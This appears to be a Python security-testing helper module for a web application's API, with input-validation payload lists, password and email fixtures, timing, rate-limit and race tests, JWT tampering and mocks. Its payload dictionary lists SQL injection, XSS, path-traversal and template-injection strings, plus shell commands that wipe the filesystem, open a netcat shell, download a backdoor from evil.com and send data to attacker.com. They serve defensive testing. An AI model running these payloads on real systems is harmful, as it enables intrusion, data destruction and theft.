"""
Security testing utilities and helpers.
"""

import asyncio
import hashlib
import hmac
import json
import random
import secrets
import string
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from unittest.mock import AsyncMock, MagicMock

import pytest
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from src.models.user import User
from src.core.security import jwt_manager


@dataclass
class SecurityTestResult:
    """Result of a security test."""
    passed: bool
    message: str
    details: Optional[Dict[str, Any]] = None
    risk_level: str = "INFO"  # INFO, LOW, MEDIUM, HIGH, CRITICAL


class SecurityTestUtils:
    """Utility class for security testing."""
    
    @staticmethod
    def generate_malicious_payloads() -> Dict[str, List[str]]:
        """Generate common malicious payloads for security testing."""
        return {
            "sql_injection": [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "admin'--",
                "' OR 'x'='x",
                "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
                "1' OR '1'='1' /*",
                "1' UNION SELECT username, password FROM users WHERE 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "<svg onload=alert('XSS')>",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
                "<input type='image' src='x' onerror='alert(\"XSS\")'>",
                "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
                "<div onmouseover='alert(\"XSS\")'>Hover me</div>",
                "';alert('XSS');//",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd",
                "/etc/shadow",
                "C:\\Windows\\System32\\config\\SAM",
                "file:///etc/passwd",
                "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            ],
            "command_injection": [
                "; cat /etc/passwd",
                "| whoami",
                "&& ls -la",
                "`uname -a`",
                "$(whoami)",
                "; rm -rf /",
                "| nc -l -p 4444 -e /bin/bash",
                "&& wget http://malicious.com/shell.php",
                "; curl -o /tmp/backdoor http://evil.com/backdoor",
                "$(curl -s http://attacker.com/steal?data=$USER)",
            ],
            "ldap_injection": [
                "*)(uid=*",
                "admin)(&(password=*",
                "*)(|(password=*))",
                "*)(&(objectclass=*))",
                "admin)(!(&(1=0))",
                "*))%00",
                "admin)((|)(cn=*))",
                "*)(|(&(objectclass=*)(cn=*))",
            ],
            "header_injection": [
                "test\r\nX-Injected-Header: injected",
                "test\nSet-Cookie: injected=true",
                "test\r\nLocation: http://evil.com",
                "test%0d%0aSet-Cookie: injected=true",
                "test\r\n\r\n<script>alert('XSS')</script>",
                "test%0d%0a%0d%0a<html><body><h1>Injected</h1></body></html>",
            ],
            "template_injection": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
                "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",
            ],
            "deserialization": [
                'O:8:"stdClass":1:{s:4:"test";s:4:"hack";}',
                'rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABGhhY2t4',
                "aced00057372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000000000000",
            ]
        }
    
    @staticmethod
    def generate_weak_passwords() -> List[str]:
        """Generate list of weak passwords for testing."""
        return [
            # Common weak passwords
            "password", "123456", "password123", "admin", "qwerty",
            "letmein", "welcome", "monkey", "1234567890", "password1",
            
            # Dictionary words
            "computer", "internet", "security", "business", "company",
            
            # Patterns
            "abcdef", "123abc", "qwerty123", "password!", "admin123",
            
            # Short passwords
            "pass", "1234", "abc", "test", "user",
            
            # Single case
            "PASSWORD", "password", "Password",
            
            # No special characters
            "Password123", "MyPassword1", "SecurePass1",
            
            # Common substitutions but still weak
            "p@ssword", "passw0rd", "1234567", "qw3rty",
        ]
    
    @staticmethod
    def generate_strong_passwords() -> List[str]:
        """Generate list of strong passwords for testing."""
        return [
            "MyStr0ng!P@ssw0rd#2023",
            "C0mpl3x_S3cur3$P@ss",
            "Ungu3ss@bl3!Passw0rd&",
            "R@nd0m&Str0ng!P@55w0rd",
            "S3cur3-C0mpl3x#P@ssw0rd!",
            "My$3cur3&P@ssw0rd#123",
            "Str0ng!P@ss&C0mpl3x#",
            "S@f3&S3cur3!P@ssw0rd$",
            "C0mpl1c@t3d&S3cur3!P@ss",
            "Unbre@k@bl3!P@ssw0rd#",
        ]
    
    @staticmethod
    def generate_invalid_emails() -> List[str]:
        """Generate list of invalid email addresses for testing."""
        return [
            # Missing @
            "invalid-email",
            "user.domain.com",
            "username",
            
            # Missing local part
            "@domain.com",
            "@",
            
            # Missing domain
            "user@",
            "user.name@",
            
            # Invalid domain
            "user@domain",
            "user@.com",
            "user@domain.",
            "user@-domain.com",
            "user@domain-.com",
            
            # Invalid characters
            "user name@domain.com",
            "user@domain .com",
            "user@domain..com",
            "user@@domain.com",
            
            # Too long
            "a" * 65 + "@domain.com",
            "user@" + "a" * 250 + ".com",
            
            # Empty
            "",
            " ",
            
            # Special cases
            "user@domain,com",
            "user;@domain.com",
            "user@domain;com",
        ]
    
    @staticmethod
    def generate_valid_emails() -> List[str]:
        """Generate list of valid email addresses for testing."""
        return [
            "user@example.com",
            "test.user@domain.co.uk",
            "user.name+tag@example.com",
            "user123@test-domain.com",
            "firstname.lastname@company.org",
            "email@123.123.123.123",  # IP address
            "user+tag@example-domain.com",
            "test_email@domain-name.co",
            "user.email.with+symbol@example.com",
            "valid.email-address@test-domain.co.uk",
        ]
    
    @staticmethod
    async def perform_timing_attack_test(
        func_correct, 
        func_incorrect, 
        iterations: int = 100
    ) -> SecurityTestResult:
        """
        Perform timing attack test to check for timing vulnerabilities.
        
        Args:
            func_correct: Function that should return correct result
            func_incorrect: Function that should return incorrect result
            iterations: Number of iterations to run
            
        Returns:
            Security test result
        """
        times_correct = []
        times_incorrect = []
        
        # Measure correct function times
        for _ in range(iterations):
            start = time.perf_counter()
            await func_correct()
            times_correct.append(time.perf_counter() - start)
        
        # Measure incorrect function times
        for _ in range(iterations):
            start = time.perf_counter()
            await func_incorrect()
            times_incorrect.append(time.perf_counter() - start)
        
        # Calculate averages and standard deviations
        avg_correct = sum(times_correct) / len(times_correct)
        avg_incorrect = sum(times_incorrect) / len(times_incorrect)
        
        # Simple statistical test
        time_difference = abs(avg_correct - avg_incorrect)
        threshold = 0.001  # 1ms threshold
        
        passed = time_difference < threshold
        risk_level = "LOW" if passed else "HIGH"
        
        return SecurityTestResult(
            passed=passed,
            message=f"Timing difference: {time_difference:.6f}s (threshold: {threshold}s)",
            details={
                "avg_correct": avg_correct,
                "avg_incorrect": avg_incorrect,
                "time_difference": time_difference,
                "iterations": iterations
            },
            risk_level=risk_level
        )
    
    @staticmethod
    async def test_rate_limiting(
        client: AsyncClient,
        endpoint: str,
        payload: Dict[str, Any],
        max_requests: int = 20,
        time_window: int = 60,
        expected_rate_limit_status: int = 429
    ) -> SecurityTestResult:
        """
        Test rate limiting on an endpoint.
        
        Args:
            client: HTTP client
            endpoint: API endpoint to test
            payload: Request payload
            max_requests: Maximum requests to send
            time_window: Time window in seconds
            expected_rate_limit_status: Expected HTTP status when rate limited
            
        Returns:
            Security test result
        """
        responses = []
        start_time = time.time()
        
        for i in range(max_requests):
            if endpoint.startswith("/"):
                response = await client.post(endpoint, json=payload)
            else:
                response = await client.get(endpoint)
            
            responses.append({
                "status_code": response.status_code,
                "timestamp": time.time() - start_time,
                "request_number": i + 1
            })
            
            # Small delay to avoid overwhelming the system
            await asyncio.sleep(0.1)
        
        # Check for rate limiting
        rate_limited_responses = [
            r for r in responses 
            if r["status_code"] == expected_rate_limit_status
        ]
        
        passed = len(rate_limited_responses) > 0
        
        return SecurityTestResult(
            passed=passed,
            message=f"Rate limiting {'detected' if passed else 'not detected'} after {max_requests} requests",
            details={
                "total_requests": max_requests,
                "rate_limited_count": len(rate_limited_responses),
                "status_codes": [r["status_code"] for r in responses],
                "time_taken": responses[-1]["timestamp"]
            },
            risk_level="MEDIUM" if not passed else "LOW"
        )
    
    @staticmethod
    def generate_jwt_token_for_testing(
        user_id: str,
        email: str,
        subscription_tier: str = "free",
        expires_delta: Optional[timedelta] = None,
        additional_claims: Optional[Dict[str, Any]] = None
    ) -> str:
        """Generate JWT token for testing purposes."""
        if expires_delta is None:
            expires_delta = timedelta(hours=1)
        
        claims = {
            "sub": user_id,
            "email": email,
            "subscription_tier": subscription_tier,
            "token_type": "access",
            "iat": datetime.utcnow(),
            "exp": datetime.utcnow() + expires_delta,
            "jti": secrets.token_urlsafe(16),
        }
        
        if additional_claims:
            claims.update(additional_claims)
        
        return jwt_manager.encode_token(claims)
    
    @staticmethod
    def create_tampered_jwt_token(original_token: str) -> str:
        """Create a tampered JWT token for testing."""
        # Split the token into parts
        parts = original_token.split(".")
        if len(parts) != 3:
            raise ValueError("Invalid JWT token format")
        
        # Tamper with the signature
        signature = parts[2]
        tampered_signature = signature[:-5] + "XXXXX"
        
        return f"{parts[0]}.{parts[1]}.{tampered_signature}"
    
    @staticmethod
    async def test_concurrent_requests(
        client: AsyncClient,
        endpoint: str,
        payloads: List[Dict[str, Any]],
        concurrent_count: int = 10
    ) -> SecurityTestResult:
        """
        Test concurrent requests to detect race conditions.
        
        Args:
            client: HTTP client
            endpoint: API endpoint to test
            payloads: List of request payloads
            concurrent_count: Number of concurrent requests
            
        Returns:
            Security test result
        """
        async def make_request(payload):
            return await client.post(endpoint, json=payload)
        
        # Run concurrent requests
        tasks = []
        for i in range(concurrent_count):
            payload = payloads[i % len(payloads)]
            tasks.append(make_request(payload))
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Analyze responses
        successful_responses = [
            r for r in responses 
            if not isinstance(r, Exception) and r.status_code < 400
        ]
        error_responses = [
            r for r in responses 
            if isinstance(r, Exception) or r.status_code >= 400
        ]
        
        # Check for race conditions (e.g., duplicate successful operations)
        status_codes = [
            r.status_code if hasattr(r, 'status_code') else 500 
            for r in responses if not isinstance(r, Exception)
        ]
        
        passed = len(error_responses) == 0 or all(
            r.status_code != 500 for r in responses 
            if hasattr(r, 'status_code')
        )
        
        return SecurityTestResult(
            passed=passed,
            message=f"Concurrent requests test: {len(successful_responses)} successful, {len(error_responses)} errors",
            details={
                "concurrent_count": concurrent_count,
                "successful_count": len(successful_responses),
                "error_count": len(error_responses),
                "status_codes": status_codes,
                "exceptions": [str(e) for e in responses if isinstance(e, Exception)]
            },
            risk_level="MEDIUM" if not passed else "LOW"
        )


class MockSecurityServices:
    """Mock security services for testing."""
    
    @staticmethod
    def create_mock_rate_limiter(
        allow_requests: bool = True,
        remaining_requests: int = 10
    ) -> MagicMock:
        """Create a mock rate limiter."""
        mock = MagicMock()
        mock.is_allowed = AsyncMock(return_value=allow_requests)
        mock.get_remaining = AsyncMock(return_value=remaining_requests)
        mock.record_request = AsyncMock()
        return mock
    
    @staticmethod
    def create_mock_audit_logger() -> MagicMock:
        """Create a mock audit logger."""
        mock = MagicMock()
        mock.log_event = AsyncMock()
        mock.log_security_event = AsyncMock()
        mock.log_authentication_event = AsyncMock()
        return mock
    
    @staticmethod
    def create_mock_notification_service() -> MagicMock:
        """Create a mock notification service."""
        mock = MagicMock()
        mock.send_email = AsyncMock()
        mock.send_sms = AsyncMock()
        mock.send_security_alert = AsyncMock()
        return mock


class SecurityTestDataGenerator:
    """Generate test data for security testing."""
    
    @staticmethod
    def create_test_user_data(
        override: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """Create test user registration data."""
        base_data = {
            "email": f"test{secrets.randbelow(10000)}@example.com",
            "password": "TestPassword123!",
            "business_idea": "Test business idea for security testing",
            "target_market": "Test market",
            "experience_level": "first-time",
            "full_name": "Test User",
            "company_name": "Test Company"
        }
        
        if override:
            base_data.update(override)
        
        return base_data
    
    @staticmethod
    def create_test_login_data(
        email: str = "test@example.com",
        password: str = "TestPassword123!",
        override: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """Create test login data."""
        base_data = {
            "email": email,
            "password": password,
            "device_id": f"test-device-{secrets.randbelow(1000)}",
            "device_name": "Test Device"
        }
        
        if override:
            base_data.update(override)
        
        return base_data
    
    @staticmethod
    def generate_boundary_test_data() -> Dict[str, List[Any]]:
        """Generate boundary test data for input validation."""
        return {
            "email_lengths": [
                "",  # Empty
                "a" * 1 + "@example.com",  # Very short
                "a" * 64 + "@example.com",  # At boundary (64 chars local part)
                "a" * 65 + "@example.com",  # Over boundary
                "test@" + "a" * 253 + ".com",  # At domain boundary
                "test@" + "a" * 254 + ".com",  # Over domain boundary
            ],
            "password_lengths": [
                "",  # Empty
                "a",  # Too short
                "A1!" + "a" * 4,  # Minimum valid (8 chars)
                "A1!" + "a" * 96,  # At boundary (100 chars)
                "A1!" + "a" * 97,  # Over boundary (101 chars)
                "A1!" + "a" * 996,  # Very long
            ],
            "business_idea_lengths": [
                "",  # Empty
                "a" * 9,  # Too short (min 10)
                "a" * 10,  # At minimum
                "a" * 500,  # At maximum
                "a" * 501,  # Over maximum
                "a" * 1000,  # Very long
            ],
            "unicode_strings": [
                "café@example.com",  # Accented characters
                "用户@example.com",  # Chinese characters
                "пользователь@example.com",  # Cyrillic
                "🙂@example.com",  # Emoji
                "test@münchen.de",  # IDN domain
            ],
            "special_characters": [
                "test+tag@example.com",
                "test.email@example.com",
                "test_email@example.com",
                "test-email@example.com",
                "test123@example.com",
            ]
        }